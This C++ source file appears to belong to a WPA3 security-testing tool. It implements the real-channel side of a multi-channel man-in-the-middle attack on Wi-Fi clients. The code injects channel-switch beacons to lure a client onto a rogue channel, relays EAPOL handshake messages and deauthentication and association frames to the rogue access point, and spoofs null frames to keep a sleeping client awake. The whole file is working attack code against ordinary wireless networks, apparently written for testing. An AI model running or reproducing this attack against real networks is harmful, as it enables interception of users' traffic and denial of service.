#include <tins/tins.h>

#include "attacks/DoS_soft/channel_switch/channel_switch.h"
#include "attacks/mc_mitm/mc_mitm.h"
#include "attacks/mc_mitm/wifi_util.h"
#include "logger/error_log.h"
#include "logger/log.h"
#include "system/hw_capabilities.h"

namespace wpa3_tester{
using namespace std;
using namespace chrono;
using namespace Tins;

void McMitm::send_to_real(PDU &pdu) const {
	sock_real->send(pdu, netconfig.real_channel);
}

void McMitm::send_to_real(const frame_raw_t &raw) const{
	sock_real->send(raw, netconfig.real_channel);
}

FrameProcess McMitm::handle_auth_from_client_real(const HWAddress<6> addr1, const Dot11 &dot11){
	if(addr1 != ap.get(SK::mac)) return CONTINUE;
	if(const auto *auth = dot11.find_pdu<Dot11Authentication>()){
		const auto client_addr = auth->addr2();

		if(client_state.get_mac() == client_addr) {
			display_traffic(dot11, "Real channel, injecting CSA beacon to try to correct");

			//TODO useless?
			CSA_attack::update_time_CSA_frames(csa_frames);
			for(auto &csa_frame : csa_frames) {
				send_to_real(csa_frame);
				//interruptible_sleep(milliseconds(100)); //TODo
			}

			client_state.update_state(ClientState::Sent_to_rogue);
			return STOP;
		}
	}
	return CONTINUE;
}

FrameProcess McMitm::handle_eapol_real(const HWAddress<6> addr1, const HWAddress<6> addr2, PDU &pdu) const{
	// EAPOL AP -> STA on real channel
	if(addr1 == sta.get(SK::mac) && addr2 == ap.get(SK::mac) && is_eapol(pdu)){
		int eapol_msg = get_eapol_msg_num(pdu);
		if(eapol_msg == 1 || eapol_msg == 3) {
			send_to_rogue(pdu);
			log(LogLevel::INFO, "Real channel: EAPOL {} AP -> STA", eapol_msg);
		}
		return STOP;
	}
	return CONTINUE;
}

void McMitm::handle_disconnect_real(const Dot11 &dot11) {
	if(!dot11.find_pdu<Dot11Deauthentication>() && !dot11.find_pdu<Dot11Disassoc>()) return;
	client_state.update_state(ClientState::Target_disconnected);
}

void McMitm::handle_from_ap_real(const Dot11 &dot11, const HWAddress<6> &addr1, const frame_raw_t &raw){
	// Forward na rogue channel
	if(client_state.get_mac() == addr1){
		if(dot11.find_pdu<Dot11Deauthentication>() || dot11.find_pdu<Dot11Disassoc>()){
			display_traffic(dot11, "Real channel", " -- MitM'ing");
			handle_disconnect_real(dot11);
			send_to_rogue(raw);
			return;
		}

		// Open-System Auth from real AP: rogue hostapd handles auth/assoc directly - ignore
		if(const auto *auth = dot11.find_pdu<Dot11Authentication>();
			auth && auth->auth_seq_number() == 2 && auth->auth_algorithm() == 0){
			log(LogLevel::DEBUG, "Real channel: dropping Open-System Auth(seq=2) relay to rogue");
			return;
		}
		if(const auto *ar = dot11.find_pdu<Dot11AssocResponse>())
			log(LogLevel::INFO, "Real channel: AssocResp status={} AID={} -> relay", ar->status_code(), ar->aid());
		send_to_rogue(raw);
	}
}

void McMitm::power_mgmt_response_real(const HWAddress<6> addr2, const Dot11 &dot11) const{
	if(dot11.addr1() == ap.get(SK::mac)){ // ->AP
		// sleep mode detection for keep wake up
		// encrypted, but still works for wake up
		// TODO check WNM sleeep mode -> cant be spoofed like this
		if(dot11.power_mgmt() && client_state.get_mac() == addr2){
			Dot11Data null_frame(ap.get(SK::mac), addr2);
			null_frame.subtype(Dot11::DATA_NULL);
			null_frame.addr3(ap.get(SK::mac));
			send_to_real(null_frame);
			display_traffic(dot11, "Rogue channel", " -- Replied");
		}
	}
}

void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu, const frame_raw_t &raw){
	auto *dot11 = pdu->find_pdu<Dot11>();
	if(!dot11) return;

	//filter out different channels
	if(const auto *rt = pdu->find_pdu<RadioTap>()) {
		if(rt->present() & RadioTap::CHANNEL &&
			rt->channel_freq() != hw_capabilities::channel_to_freq(netconfig.real_channel))
			return;
	}

	const auto [addr1, addr2] = get_addrs(*pdu, raw);
	if(addr2 == HWAddress<6>() && dot11->type() != Dot11::CONTROL){
		display_traffic(*pdu, "Real channel", "- CONTROL -- Ignore");
		return;
	}

	if(dot11->find_pdu<Dot11ProbeRequest>() || dot11->find_pdu<Dot11Beacon>()) return;

	power_mgmt_response_real(addr2, *dot11);

	#define SOLVE_OR_CONTINUE(handle_fun) if(handle_fun) return;

	SOLVE_OR_CONTINUE(handle_eapol_real(addr1, addr2, *dot11))
	SOLVE_OR_CONTINUE(handle_auth_from_client_real(addr1, *dot11))
	#undef SOLVE_OR_CONTINUE

	if(dot11->addr1() == ap.get(SK::mac)){ // -> AP
		if(client_state.get_mac() == addr2) display_traffic(*dot11, "Real channel");
		// STA -> AP
		handle_disconnect_real(*dot11);
	} else if(addr2 == ap.get(SK::mac)){ // AP ->
		handle_from_ap_real(*dot11, addr1, raw);
	}
}
}